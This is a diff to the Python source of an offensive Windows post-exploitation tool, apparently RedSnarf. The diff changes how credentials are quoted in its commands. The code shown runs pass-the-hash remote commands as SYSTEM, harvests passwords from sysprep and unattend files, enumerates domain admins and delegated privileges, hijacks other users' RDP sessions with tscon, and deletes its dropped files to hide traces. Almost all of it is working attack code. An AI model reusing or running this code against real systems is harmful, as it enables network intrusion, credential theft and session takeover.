-						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\rsc.exe c:\\sshot.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\rsc.exe c:\\sshot.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 
 						time.sleep(4)
 
@@ -1624,12 +1624,12 @@ def datadump(user, passw, host, path, os_version):
 						fout.write('SchTasks /delete /TN "RedSnarf_ScreenShot" /f')
 						fout.close() 
 
-						proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put sshot_del.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+						proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd /tmp; put sshot_del.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 					
-						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+host+" \"c:\\sshot_del.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --system --uninstall \/\/"+host+" \"c:\\sshot_del.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 						print proc.communicate()[0]
 					
-						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\sshot_del.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\sshot_del.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 					
 						time.sleep(4)
 
@@ -1641,7 +1641,7 @@ def datadump(user, passw, host, path, os_version):
 				
 				try:					
 					#Check for 64 Bit Version Values of VMWare DeployData
-					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Wow6432Node\VMware, Inc.\Guest Customization\" /v \"DeployData\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+					proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Wow6432Node\VMware, Inc.\Guest Customization\" /v \"DeployData\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 					deploydata=proc.communicate()[0]
 					deploydata=deploydata[108:].rstrip()
 					
@@ -1653,11 +1653,11 @@ def datadump(user, passw, host, path, os_version):
 						print colored("[+]Registry values indicate this machine may have been deployed via a VMware Template",'yellow')
 						print colored("[+]Values for <EncryptedValue> and guestcustutil.exe were found in DeployData",'yellow')
 						print colored("[+]You may wish to double check the unattend.xml file which can be found in the path indicated below...",'yellow')
-						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Wow6432Node\VMware, Inc.\Guest Customization\" /v \"SysprepFilePath\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Wow6432Node\VMware, Inc.\Guest Customization\" /v \"SysprepFilePath\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 						print proc.communicate()[0]
 					
 					#Check for 32 Bit Version Values of VMWare DeployData
-					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\VMware, Inc.\Guest Customization\" /v \"DeployData\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+					proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\VMware, Inc.\Guest Customization\" /v \"DeployData\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 					deploydata=proc.communicate()[0]
 					deploydata=deploydata[108:].rstrip()
 					
@@ -1668,16 +1668,16 @@ def datadump(user, passw, host, path, os_version):
 						print colored("[+]Registry values indicate this machine may have been deployed via a VMware Template",'yellow')
 						print colored("[+]Values for <EncryptedValue> and guestcustutil.exe were found in DeployData",'yellow')
 						print colored("[+]You may wish to double check the unattend.xml file which can be found in the path indicated below...",'yellow')
-						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\VMware, Inc.\Guest Customization\" /v \"SysprepFilePath\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\VMware, Inc.\Guest Customization\" /v \"SysprepFilePath\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 						print proc.communicate()[0]
 
 					print colored("\n[+]Attempting to Find Unattend/Sysprep Files",'green')
 					
-					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get sysprep.inf\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+outputpath+host+"; get sysprep.inf\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory sysprep -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get sysprep.xml\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
-					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory windows/panther -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get unattend.xml\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
-					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory windows/panther -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get Unattended.xml\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
-					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory windows/panther/unattend -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get Unattended.xml\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)		
+					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory windows/panther -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+outputpath+host+"; get unattend.xml\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory windows/panther -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+outputpath+host+"; get Unattended.xml\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory windows/panther/unattend -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+outputpath+host+"; get Unattended.xml\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)		
 
 					if os.path.isfile(outputpath+host+"/unattend.xml"):
 						print colored("[+]" +outputpath+host+"/unattend.xml file found, grepping for username, password, group",'green')
@@ -1828,11 +1828,11 @@ def get_domain_admins(ip,username,password,domain):
 	else:
 		proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain+"\\"+username+"%"+password+"\' --uninstall --system \/\/"+ip+" 'net group \"Domain Admins\" /domain' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 		stdout_value = proc.communicate()[0]
-		
+
 		if username.upper() in stdout_value.upper():
 			DomainAdmin = True
 			#If account is domain admin try and get status.
-			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain+"\\"+username+"%"+password+"\" --uninstall --system \/\/"+ip+" 'net user '"+username+"' /domain' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+			proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain+"\\"+username+"%"+password+"\' --uninstall --system \/\/"+ip+" 'net user '"+username+"' /domain' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 			stdout_value = proc.communicate()[0]
 			if not "Account active               Yes" in stdout_value:
 				print colored("[-]Account is either disabled or locked...",'red')
@@ -1899,7 +1899,7 @@ def run():
 			x=smbClient.login(user, passwd, domain_name, lmhash, nthash)
 					
 			if x==None or x==True:
-        		
+
 				if smbClient.getServerDNSDomainName()!=domain_name:
 					print colored("[!]"+host+" Command line Domain name ",'red')+domain_name+colored(" does not match detected Domain Name ",'red')	+smbClient.getServerDNSDomainName() 
 
@@ -2008,11 +2008,11 @@ def run():
 							print colored("[+]"+host+" Shares written to "+outputpath+targets[0]+'/shares.txt','yellow')
 
 						print colored("[+]"+host+" Enumerating Local Drives",'green')
-						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'fsutil fsinfo drives' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall \/\/"+targets[0]+" 'fsutil fsinfo drives' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 						drives = proc.communicate()[0]
 						print colored("[+]"+host+" Local " + drives.strip(),'yellow')
 
-						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'net use' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall \/\/"+targets[0]+" 'net use' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 						mappedshares = proc.communicate()[0]
 						if not "There are no entries in the list" in mappedshares:
 							print colored("[+]"+host+" Mapped drives detected",'green')
@@ -3261,11 +3261,11 @@ if windows_updates != 'n':
 			print colored("\n[+]Creating directory for host: "+targets[0],'green')
 
 		print colored("\n[+]Uploading Files",'yellow')
-		proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+os.getcwd()+"/wupdate/"+"; put mbsacli.exe\' 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()	
-		proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+os.getcwd()+"/wupdate/"+"; put wusscan.dll\' 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()	
-		proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+os.getcwd()+"/wupdate/"+"; put wsusscn2.cab\' 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()	
+		proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+os.getcwd()+"/wupdate/"+"; put mbsacli.exe\' 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()	
+		proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+os.getcwd()+"/wupdate/"+"; put wusscan.dll\' 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()	
+		proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+os.getcwd()+"/wupdate/"+"; put wsusscn2.cab\' 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()	
 		
-		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \'cmd.exe /C dir c:\\ \' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+		proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --system --uninstall \/\/"+targets[0]+" \'cmd.exe /C dir c:\\ \' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 		result=proc.communicate()[0]		
 		if "mbsacli.exe" not in result or "wusscan.dll" not in result or "wsusscn2.cab" not in result:
 			print colored("[-]Something has gone wrong uploading files..\n",'red')
@@ -3289,10 +3289,10 @@ if windows_updates != 'n':
 		print colored("   \             y'",'red')
 		print colored("    `-.._____..-'\n\n",'red')
 
-		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \"cmd.exe /C c:\\mbsacli.exe /xmlout /catalog c:\\wsusscn2.cab /nvc > c:\\results.xml \" 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()		
+		proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --system --uninstall \/\/"+targets[0]+" \"cmd.exe /C c:\\mbsacli.exe /xmlout /catalog c:\\wsusscn2.cab /nvc > c:\\results.xml \" 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()		
 
 		print colored("[+]Getting Results",'yellow')
-		proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; get results.xml"+"\' 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()	
+		proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+outputpath+targets[0]+"; get results.xml"+"\' 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()	
 		
 		if os.path.exists(outputpath+targets[0]+"/results.xml"):
 			print colored("[+]Results saved to ",'yellow')+colored(outputpath+targets[0]+"/results.xml",'green')
@@ -3300,7 +3300,7 @@ if windows_updates != 'n':
 			print colored("[+]Failed to get updates...",'red')
 
 		print colored("[+]Cleaning Up\n",'yellow')
-		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\results.xml c:\\wsusscn2.cab.dat c:\\wsusscn2.cab c:\\mbsacli.exe c:\\wusscan.dll\" 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()	
+		proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\results.xml c:\\wsusscn2.cab.dat c:\\wsusscn2.cab c:\\mbsacli.exe c:\\wusscan.dll\" 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()	
 
 		#Parse the xml
 		if os.path.exists(outputpath+targets[0]+"/results.xml"):
@@ -3389,14 +3389,14 @@ if delegated_privs in yesanswers:
 	print colored("[+]Getting OU List & Checking for possible Delegated Privileges",'green')
 
 	#Get all OU's available in domain
-	proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C dsquery ou domainroot' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+	proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall \/\/"+targets[0]+" 'cmd /C dsquery ou domainroot' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 	tmpoulist = proc.communicate()[0]			
 	
 	#Cycle ou's and get privs
 	for ou in tmpoulist.splitlines():
 		print ou[1:(len(ou)-1)]
 
-		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C dsacls "+ou+"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+		proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall \/\/"+targets[0]+" 'cmd /C dsacls "+ou+"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 		ouprivs = proc.communicate()[0]	
 
 		#Flag things we're interested in here
@@ -3429,7 +3429,7 @@ if delegated_privs in yesanswers:
 			uname= (name.split(":")[0])
 			#print uname
 			uname= (uname.split("\\")[1])
-			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C net user \""+uname+"\" /domain' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+			proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall \/\/"+targets[0]+" 'cmd /C net user \""+uname+"\" /domain' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 			fullname = proc.communicate()[0]
 			
 			for info in fullname.splitlines():
@@ -3466,7 +3466,7 @@ if delegated_privs in yesanswers:
 
 			print colored("\n[+]Gathering details for ",'green')+colored(fullnames[int(response1)],'yellow')
 
-			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C dsacls \""+"CN="+fullnames[int(response1)]+","+oulist[int(response1)]+"\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+			proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall \/\/"+targets[0]+" 'cmd /C dsacls \""+"CN="+fullnames[int(response1)]+","+oulist[int(response1)]+"\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 			userprivs = proc.communicate()[0]	
 			for privs in userprivs.splitlines():
 				if "Reset Password" in privs:
@@ -3486,7 +3486,7 @@ if delegated_privs in yesanswers:
 				print colored("\n[+]Gathering details for ",'green')+colored(fullnames[int(x)],'yellow')
 				print colored("[+]Users OU ",'green')+colored(oulist[int(x)],'yellow')
 
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C dsacls \""+"CN="+fullnames[int(x)]+","+oulist[int(x)]+"\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall \/\/"+targets[0]+" 'cmd /C dsacls \""+"CN="+fullnames[int(x)]+","+oulist[int(x)]+"\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				userprivs = proc.communicate()[0]	
 				for privs in userprivs.splitlines():
 					if "Send As" in privs:
@@ -3522,7 +3522,7 @@ if rdp_connect in yesanswers or "ID" in rdp_connect:
 	rdp_sessions = []
 	
 	#Check to see if NLA is turned on
-	proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+	proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 	NLAStatus = proc.communicate()[0]
 
 	#Error if NLA is turned on
@@ -3548,7 +3548,7 @@ if rdp_connect in yesanswers or "ID" in rdp_connect:
 				print colored("[+]RDP Session Hijack:",'green')
 				print colored("[+]Note - RDP Session Hijack can be run with -uRP ID or -uRP y:",'yellow')
 				print colored("[+]-uRP y is more stable:\n",'yellow')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C query user \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C query user \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				sessions = proc.communicate()[0]
 				
 				#Check to see if sessions are available
@@ -3570,10 +3570,10 @@ if rdp_connect in yesanswers or "ID" in rdp_connect:
 					
 					if len(rdp_sessions)==0:
 						proc = subprocess.Popen("rdesktop "+targets[0]+" 2>/dev/null", shell=True)
-						os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"tscon "+usr_response+" /dest:"+"rdp-tcp#0"+"\" 2>/dev/null")
+						os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" \"tscon "+usr_response+" /dest:"+"rdp-tcp#0"+"\" 2>/dev/null")
 					else:
 						proc = subprocess.Popen("rdesktop "+targets[0]+" 2>/dev/null", shell=True)
-						os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"tscon "+usr_response+" /dest:"+"rdp-tcp#"+str((len(rdp_sessions)))+"\" 2>/dev/null")
+						os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" \"tscon "+usr_response+" /dest:"+"rdp-tcp#"+str((len(rdp_sessions)))+"\" 2>/dev/null")
 				
 				sys.exit(1)
 			except OSError:
@@ -3584,7 +3584,7 @@ if rdp_connect in yesanswers or "ID" in rdp_connect:
 			try:			
 				print colored("[+]RDP Session Hijack:",'green')
 				print colored("[+]Note - RDP Session Hijack can be run with -uRP ID or -uRP y:\n",'yellow')			
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C query user \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C query user \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				sessions = proc.communicate()[0]
 				
 				#Check to see if sessions are available
@@ -3619,11 +3619,11 @@ if rdp_connect in yesanswers or "ID" in rdp_connect:
 				
 				if "rdp-tcp#" in sess_dest and usr_response !="":
 					proc = subprocess.Popen("rdesktop "+targets[0]+" 2>/dev/null", shell=True)
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"tscon "+usr_response+" /dest:"+sess_dest+"\" 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" \"tscon "+usr_response+" /dest:"+sess_dest+"\" 2>/dev/null")
 					sys.exit()
 				
 				if usr_response !="":
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"tscon "+usr_response+" /dest:"+rdp_sessions[int(sess_dest)]+"\" 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" \"tscon "+usr_response+" /dest:"+rdp_sessions[int(sess_dest)]+"\" 2>/dev/null")
 					sys.exit()
 
 			except OSError:
@@ -3636,7 +3636,7 @@ if lockdesktop in yesanswers:
 		try:			
 			print colored("[+]Retrieving Desktops:\n",'green')
 			
-			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C query user \" 2>/dev/null")
+			os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C query user \" 2>/dev/null")
 
 			usr_response = raw_input("\nPlease enter the username whose desktop you wish to lock : ")
 			if usr_response !="":
@@ -3647,8 +3647,8 @@ if lockdesktop in yesanswers:
 				fout.write('SchTasks /run /TN "RedSnarf_LockDesktop" \n')
 				fout.close() 
 					
-				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put lockdesktop.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \"c:\\lockdesktop.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd /tmp; put lockdesktop.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --system --uninstall \/\/"+targets[0]+" \"c:\\lockdesktop.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 				print proc.communicate()[0]
 				
 				print colored("[+]Tidying Up...",'yellow')
@@ -3657,11 +3657,11 @@ if lockdesktop in yesanswers:
 				fout.write('del c:\\lockdesktop.bat"\n')
 				fout.close() 
 
-				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put lockdesktop_cleanup.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd /tmp; put lockdesktop_cleanup.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 				print proc.communicate()[0]
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \"c:\\lockdesktop_cleanup.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --system --uninstall \/\/"+targets[0]+" \"c:\\lockdesktop_cleanup.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]					
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\lockdesktop_cleanup.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\lockdesktop_cleanup.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 				print proc.communicate()[0]
 
 				print colored("[+]User desktop "+usr_response+" should be locked...",'green')
@@ -3682,7 +3682,7 @@ if win_scp!='n':
 	if len(targets)==1:
 		try:				
 			#First Check to see whether a master password is being used
-			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Configuration\Security\" /v \"UseMasterPassword\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+			proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Configuration\Security\" /v \"UseMasterPassword\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 			UseMasterPassword = proc.communicate()[0]
 			if "0x1" in UseMasterPassword:
 				print colored("[+]WinSCP Master Password Detection:",'green')
@@ -3690,7 +3690,7 @@ if win_scp!='n':
 				sys.exit()
 
 			print colored("[+]Getting WinSCP Sessions:",'green')
